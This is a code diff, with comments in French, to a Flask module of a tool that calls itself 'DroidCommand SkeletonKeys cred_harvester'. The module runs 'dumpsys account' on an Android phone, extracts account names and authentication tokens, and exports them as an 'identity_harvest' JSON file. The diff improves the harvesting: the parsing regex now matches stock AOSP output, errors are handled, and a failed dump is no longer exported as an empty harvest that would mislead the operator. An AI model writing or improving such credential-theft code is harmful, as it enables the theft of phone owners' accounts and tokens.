@@ -41,7 +41,13 @@ def _shell(cmd, timeout=25):
 # --------------------------------------------------------------------------
 # dumpsys account parsing
 # --------------------------------------------------------------------------
-_ACCOUNT_RE = re.compile(r"Account\s*\{[^}]*?type=([^,\}]+),\s*name=([^,\}]+)", re.I)
+# H12: AOSP Account.toString() imprime name= en premier sur les builds stock;
+# certains OEM impriment type= d'abord. Les deux ordres sont acceptés et
+# normalisés dans parse_dumpsys_account (l'ancien regex imposait type= first
+# → zéro match sur stock → récolte silencieusement vide).
+_ACCOUNT_RE = re.compile(
+    r"Account\s*\{[^}]*?(?:\btype=([^,\}]+),\s*\bname=([^,\}]+)"
+    r"|\bname=([^,\}]+),\s*\btype=([^,\}]+))", re.I)
 _TOKEN_RE = re.compile(
     r"authtoken(?:s)?\[([^\]]+)\]\s*[:=]\s*([^\s{][^\n]*)", re.I)
 _ALT_TOKEN_RE = re.compile(   # some builds: "AuthToken: type=... token=..."
@@ -58,8 +64,12 @@ def parse_dumpsys_account(raw):
     for line in raw.splitlines():
         m = _ACCOUNT_RE.search(line)
         if m:
-            atype = m.group(1).strip()
-            aname = m.group(2).strip()
+            if m.group(1) is not None:      # branche type= first (OEM)
+                atype = m.group(1).strip()
+                aname = m.group(2).strip()
+            else:                            # branche name= first (stock AOSP)
+                aname = m.group(3).strip()
+                atype = m.group(4).strip()
             key = f"{atype}|{aname}"
             if key not in accounts:
                 accounts[key] = {"type": atype, "name": aname,
@@ -114,13 +124,21 @@ def _classify(tokens):
 
 @harvester_bp.route("/accounts")
 def list_accounts():
-    res = _shell("dumpsys account", timeout=30)
-    if not res["success"] and not res.get("stdout"):
+    try:
+        # M35: plus aucun accès direct res["success"] / parsing non gardé —
+        # toute anomalie finit en 500 JSON propre, jamais en 500 Flask brut
+        res = _shell("dumpsys account", timeout=30)
+        if not res.get("success") and not res.get("stdout"):
+            return jsonify({"success": False,
+                            "error": res.get("stderr") or "dumpsys account refusé"}), 502
+        accounts = parse_dumpsys_account(res.get("stdout", ""))
+        for acc in accounts:
+            acc["tokens"] = _classify(acc["tokens"])
+    except Exception as e:
+        # M35: détail en log, message générique au client
+        log.warning("list_accounts a échoué: %s", e)
         return jsonify({"success": False,
-                        "error": res.get("stderr") or "dumpsys account refusé"}), 502
-    accounts = parse_dumpsys_account(res.get("stdout", ""))
-    for acc in accounts:
-        acc["tokens"] = _classify(acc["tokens"])
+                        "error": "échec récolte comptes (voir logs)"}), 500
     visible_tokens = sum(len(a["tokens"]) for a in accounts)
     return jsonify({
         "success": True,
@@ -138,16 +156,28 @@ def list_accounts():
 @harvester_bp.route("/export")
 def export_accounts():
     """Full harvest as a JSON download (browser handles persistence)."""
-    res = _shell("dumpsys account", timeout=30)
-    accounts = parse_dumpsys_account(res.get("stdout", "")) \
-        if res.get("stdout") else []
-    for acc in accounts:
-        acc["tokens"] = _classify(acc["tokens"])
-    payload = {
-        "tool": "DroidCommand SkeletonKeys cred_harvester",
-        "exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "accounts": accounts,
-    }
+    try:
+        res = _shell("dumpsys account", timeout=30)
+        # M34: un dumpsys refusé ne doit pas s'exporter en récolte vide
+        # "propre" — l'opérateur croirait le téléphone vierge
+        if not res.get("success") and not res.get("stdout"):
+            return jsonify({"success": False,
+                            "error": res.get("stderr") or "dumpsys account refusé"}), 502
+        accounts = parse_dumpsys_account(res.get("stdout", "")) \
+            if res.get("stdout") else []
+        for acc in accounts:
+            acc["tokens"] = _classify(acc["tokens"])
+        payload = {
+            "tool": "DroidCommand SkeletonKeys cred_harvester",
+            "exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "harvest_ok": bool(res.get("success")),
+            "accounts": accounts,
+        }
+    except Exception as e:
+        # M35: détail en log, message générique au client
+        log.warning("export_accounts a échoué: %s", e)
+        return jsonify({"success": False,
+                        "error": "échec export (voir logs)"}), 500
     fname = f"identity_harvest_{time.strftime('%Y%m%d_%H%M%S')}.json"
     return Response(json.dumps(payload, indent=2, ensure_ascii=False),
                     mimetype="application/json",
